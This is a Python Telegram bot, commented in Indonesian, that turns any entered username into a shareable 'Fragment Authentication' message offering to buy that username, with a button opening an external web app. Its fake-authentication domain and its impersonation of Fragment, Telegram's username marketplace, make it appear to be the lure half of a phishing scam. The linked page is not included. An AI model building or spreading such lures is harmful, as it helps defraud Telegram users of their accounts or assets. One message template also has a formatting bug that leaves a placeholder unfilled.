import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler, InlineQueryHandler

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Token bot dari environment variable
BOT_TOKEN = os.environ.get('BOT_TOKEN')
MINI_APP_URL = os.environ.get('WEB_APP_URL', 'https://fragment-authentication.vercel.app/')
BOT_USERNAME = os.environ.get('BOT_USERNAME', 'authFragment_appbot')

# State management
user_data = {}

# Command /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_data[user_id] = {'state': 'awaiting_username'}
    
    await update.message.reply_text('Username Please ?')

# Handle username input
async def handle_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    if user_id not in user_data or user_data[user_id].get('state') != 'awaiting_username':
        await update.message.reply_text('Silakan ketik /start untuk memulai.')
        return
    
    username = update.message.text.strip()
    
    if not username:
        await update.message.reply_text('Username tidak valid. Silakan ketik username yang valid.')
        return
    
    user_data[user_id]['username'] = username
    user_data[user_id]['state'] = 'completed'
    
    # Kirim pesan dengan tombol share
    await send_shareable_message(update, context, username)

async def send_shareable_message(update: Update, context: ContextTypes.DEFAULT_TYPE, username: str):
    """Mengirim pesan yang bisa dibagikan"""
    message_text = f"""🔐 *Fragment Authentication*

📝 **Direct offer to sell your username**
👤 @{username}

_Share this offer using @{BOT_USERNAME}_"""

    keyboard = [
        [InlineKeyboardButton("🔍 View Detail", web_app={"url": f"{MINI_APP_URL}?username={username}"})],
        [InlineKeyboardButton("📤 Share via Inline", switch_inline_query=username)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=message_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# Inline Query Handler - untuk efek "via @bot"
async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle inline queries"""
    query = update.inline_query.query
    
    # Jika query kosong, berikan instruksi
    if not query:
        results = [
            InlineQueryResultArticle(
                id="1",
                title="Share Username Offer",
                description="Ketik username yang ingin dibagikan",
                input_message_content=InputTextMessageContent(
                    message_text="🔐 *Fragment Authentication*\n\n📝 **Direct offer to sell your username**\n👤 @username\n\n_Shared via @{BOT_USERNAME}_",
                    parse_mode='Markdown'
                ),
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔍 View Detail", web_app={"url": MINI_APP_URL})
                ]])
            )
        ]
    else:
        # Jika ada query (username)
        username = query.strip()
        results = [
            InlineQueryResultArticle(
                id="1",
                title=f"Share offer for @{username}",
                description="Klik untuk membagikan penawaran username",
                input_message_content=InputTextMessageContent(
                    message_text=f"""🔐 *Fragment Authentication*

📝 **Direct offer to sell your username**
👤 @{username}

_Shared via @{BOT_USERNAME}_""",
                    parse_mode='Markdown'
                ),
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔍 View Detail", web_app={"url": f"{MINI_APP_URL}?username={username}"})
                ]])
            )
        ]
    
    await update.inline_query.answer(results, cache_time=1)

# Command untuk membuat pesan shareable
async def share_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Command /share untuk membuat pesan yang bisa dibagikan"""
    if context.args:
        username = context.args[0]
    else:
        user_id = update.effective_user.id
        if user_id in user_data and user_data[user_id].get('state') == 'completed':
            username = user_data[user_id].get('username')
        else:
            await update.message.reply_text("Usage: /share <username> atau ketik /start dulu")
            return
    
    await send_shareable_message(update, context, username)

# Handler lainnya
async def handle_other_messages(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if user_id in user_data and user_data[user_id].get('state') == 'awaiting_username':
        await update.message.reply_text('Silakan ketik username Anda.')
    else:
        await update.message.reply_text('Silakan ketik /start untuk memulai.')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Error occurred: {context.error}")

def main() -> None:
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN environment variable is required")
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("share", share_command))
    application.add_handler(InlineQueryHandler(inline_query))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username))
    application.add_handler(MessageHandler(filters.ALL, handle_other_messages))
    application.add_error_handler(error_handler)
    
    # Start bot
    port = int(os.environ.get('PORT', 8443))
    webhook_url = os.environ.get('WEBHOOK_URL')
    
    if webhook_url:
        application.run_webhook(
            listen="0.0.0.0",
            port=port,
            url_path=BOT_TOKEN,
            webhook_url=f"{webhook_url}/{BOT_TOKEN}"
        )
    else:
        application.run_polling()

if __name__ == '__main__':
    main()